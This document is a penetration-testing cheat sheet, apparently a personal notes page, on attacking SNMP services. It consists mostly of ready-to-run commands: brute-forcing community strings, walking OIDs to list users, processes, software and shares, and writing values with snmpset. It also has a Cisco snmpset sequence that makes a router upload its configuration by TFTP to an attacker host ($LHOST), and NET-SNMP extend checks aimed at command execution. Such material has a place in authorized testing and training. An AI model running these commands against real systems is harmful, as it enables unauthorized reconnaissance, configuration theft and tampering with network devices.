# SNMP Enumeration & Exploitation

**Tags:** #snmp #enumeration #network
**Port:** 161/UDP (agent), 162/UDP (trap), 10161 (TLS)

---

## Detection

```bash
nmap -sU -p 161,162 --script snmp-brute,snmp-info,snmp-sysdescr $TARGET
```

## Community String Brute Force

```bash
# onesixtyone (fast)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET

# nmap brute
nmap -sU -p 161 --script snmp-brute $TARGET
```

## Enumeration

```bash
# Full walk — version 1 (public community)
snmpwalk -v1 -c public $TARGET
snmpwalk -v2c -c public $TARGET

# Install MIBs for human-readable output
sudo apt install snmp-mibs-downloader
sudo download-mibs
echo "mibs +" >> /etc/snmp/snmp.conf

# Key OIDs
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.1       # System info
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.6.13.1.3    # Open TCP ports
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.1.6.0    # Users logged in
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25   # Windows user accounts
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.2.2.1.2     # Network interfaces

# Windows shares
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.27

# Cisco router config (if read community known)
snmpwalk -v2c -c COMMUNITY $TARGET 1.3.6.1.4.1.9
```

## Exploit Write Access (Write Community String)

```bash
# Test write access
snmpset -v2c -c private $TARGET sysContact.0 s "hacked"

# Cisco IOS config tftp upload (if write + TFTP accessible)
snmpset -v2c -c private $TARGET .1.3.6.1.4.1.9.2.1.55.0 s "$LHOST"
snmpset -v2c -c private $TARGET .1.3.6.1.4.1.9.2.1.56.0 i 1
```

## NET-SNMP Extend (RCE)

```bash
# If NET-SNMP with exec/extend configured
snmpwalk -v2c -c public $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v2c -c public $TARGET NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# Check for command execution output
snmpwalk -v2c -c public $TARGET .1.3.6.1.4.1.8072.1.3.2
```

## snmp-check (All-in-one)

```bash
snmp-check $TARGET -c public -v 1
snmp-check $TARGET -c public -v 2c
```

## SNMP v3 Enumeration

```bash
# If v3 creds found
snmpwalk -v3 -l authPriv -u $USER -a SHA -A $AUTH_PASS -x AES -X $PRIV_PASS $TARGET
```

## Related Notes

- [[03-Enumeration/SNMP-Enumeration]] — Detailed SNMP enumeration
- [[09-Methodologies/Full Checklist]] — SNMP in engagement checklist
